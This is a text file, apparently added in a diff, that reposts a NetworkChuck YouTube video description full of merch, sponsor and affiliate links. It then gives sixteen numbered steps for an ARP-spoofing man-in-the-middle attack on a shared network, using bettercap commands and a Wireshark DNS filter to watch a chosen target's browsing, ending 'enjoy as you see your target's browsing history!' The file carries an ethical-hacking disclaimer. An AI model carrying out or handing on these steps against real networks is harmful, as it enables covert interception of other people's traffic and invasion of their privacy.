@@ -1,0 +1,145 @@
+﻿How to hack into a wifi network?
+
+
+
+
+*Source = https://www.youtube.com/watch?v=dZwbb42pdtg
+*Credits = @NetworkChuck (YouTube)
+*Written By = Arinjay Kumar
+
+Disclamer:
+This is a real wifi attack. Do not use this to anyone without him/her(s) explicit permission. You are responsible for your acts not me. You may use this in your home or to your friends and families but only with thier explicit permission. I strictly do not support any type of hacking else than "White-Hat Hacking". This is illegal is you use it for wrong purposes or intention. This .txt file is intended solely for educational purposes. Users are reminded to adhere strictly to legal and ethical guidelines, obtaining proper authorization before engaging in any form of security testing. Respect user privacy, and always prioritize responsible disclosure of vulnerabilities.
+
+Note:
+As ethical hackers, our mission is to contribute positively to the cybersecurity landscape. By using these resources responsibly, we can collectively enhance digital security and protect online environments.
+
+Things that you are going to learn from this .txt file:
+You are going to learn; how to hack into a wifi. 
+Which will give you the browsing history of your target.
+
+Description: (From *Source)
+NetworkChuck tagged products below. Learn more
+
+City Office Tee Black / L
+Limited delivery areas
+store.networkchuck.com/products/city-office-tee?variant=44463986081951&currency=USD&utm_medium=product_sync&utm_source=google&utm_content=sag_organic&utm_campaign=sag_organic&srsltid=AfmBOoob67Imykyq6VcgCLMioqOcHdmWHgDrdG7ArdqoVzE-8BNkY3uCVOA
+ 
+
+Default Route 12 oz / Whole Bean
+Limited delivery areas
+store.networkchuck.com/products/copy-of-bali-blue?variant=42859017470111&currency=USD&utm_medium=product_sync&utm_source=google&utm_content=sag_organic&utm_campaign=sag_organic&srsltid=AfmBOopx99N5yuNGy8OD7nunE86tbtXpeN_tub3ha_wlU41l1CStt2J8ico
+Get NordVPN 2Y plan + 4 months free here  ➼ https://nordvpn.com/networkchuck It’s risk-free with Nord’s 30-day money-back guarantee!
+
+
+WiFi hacking is very much still a thing performed by both white hat and black hat hackers. In this video, NetworkChuck will demonstrate how hackers might hack a wifi network from three different levels or perspectives, a Noob, Hipster and Pro. All of the wireless attacks demonstrated in this video are real and possible. The purpose of this video is NOT to equip an army of skiddies but to educate people on how WiFi hacks occur and what they can do to protect themselves and the networks they run. In this video, NetworkChuck will demonstrate man-in-the-middle attacks, evil twin attacks, arp spoofing, dns spoofing and wifi password cracking.
+
+
+
+🔥🔥Join the NetworkChuck Academy!: https://ntck.co/NCAcademy 
+
+
+
+**Sponsored by NordVPN
+
+
+
+
+
+
+
+SUPPORT NETWORKCHUCK
+---------------------------------------------------
+➡️NetworkChuck membership: https://ntck.co/Premium 
+☕☕ COFFEE and MERCH: https://ntck.co/coffee 
+
+Check out my new channel: https://ntck.co/ncclips 
+
+🆘🆘NEED HELP?? Join the Discord Server:  
+
+ / discord   
+
+STUDY WITH ME on Twitch: https://bit.ly/nc_twitch 
+
+READY TO LEARN??
+---------------------------------------------------
+-Learn Python: https://bit.ly/3rzZjzz 
+-Get your CCNA: https://bit.ly/nc-ccna 
+
+FOLLOW ME EVERYWHERE
+---------------------------------------------------
+Instagram:  
+
+ / networkchuck   
+Twitter:  
+
+ / networkchuck   
+Facebook:  
+
+ / networkchuck   
+Join the Discord server: http://bit.ly/nc-discord 
+
+
+
+
+AFFILIATES & REFERRALS
+---------------------------------------------------
+(GEAR I USE...STUFF I RECOMMEND)
+My network gear: https://geni.us/L6wyIUj 
+Amazon Affiliate Store: https://www.amazon.com/shop/networkchuck 
+Buy a Raspberry Pi: https://geni.us/aBeqAL
+Do you want to know how I draw on the screen?? Go to https://ntck.co/EpicPen and use code NetworkChuck to get 20% off!! 
+fast and reliable unifi in the cloud: https://hostifi.com/?via=chuck
+
+
+
+
+#wifihacking #wirelessattacks #flipperzero
+
+
+Steps to hack into a wifi: (Level 1 as per the video only, as it is only software based. Also, this will only work if you ar connected to the wifi that your target is also connected to.)
+
+1. Install and setup an VM(Virtual Machine)through an video or a tutorial. Eg: VM Ware, Virtual Box, etc.
+
+2. Download "Kali Linux" .iso file for the VM(Virtual Machine) you are using.
+
+3. Setup "Kali Linux" into your VM(Virtual Machine) through an video or a tutorial.
+
+4. Run "Kali Linux" in your VM(Virtual Machine).
+
+5. Set it up through an video or a tutorial.
+
+6. Install "Wireshark" from your web browser from an video or a tutorial.
+
+7. Open your terminal.
+
+8. Type "sudo bettercap -iface eth0" and press "ENTER" key on your keyboard.
+
+9. Type "net.probe on" and press "ENTER" key on your keyboard.
+
+10. Type "net.show" and press "ENTER" key on your keyboard.
+
+11. Type "set arp.spoof.fullduplex true" and press "ENTER" key on your keyboard.
+
+12. Type "set arp.spoof.targets {Find your target from the "Name" section and locate it's "IP", copy it's "IP" and paste it here.}" and press "ENTER" key on your keyboard.
+
+13. Now open "Wireshark", Click on "wlan0" from the "Capture" section.
+
+14. Type "ip.src=={Here comes your target's "IP".} and dns" and press "ENTER" key on your keyboard. (In the search box at the top.)
+
+15. Now come back to your terminal and type "arp.spoof on" and press "ENTER" key on your keyboard.
+
+16. Now enjoy as you see your target's browsing history! 
+
+
+Points to be noted:
+1. If you stuck in any type of problem, first; view the main video or second; google it, etc.
+
+
+*I am not a part of @NetworkChuck company.
+
+
+
+
+© Copyright 2024 Arinjay Kumar
+
+
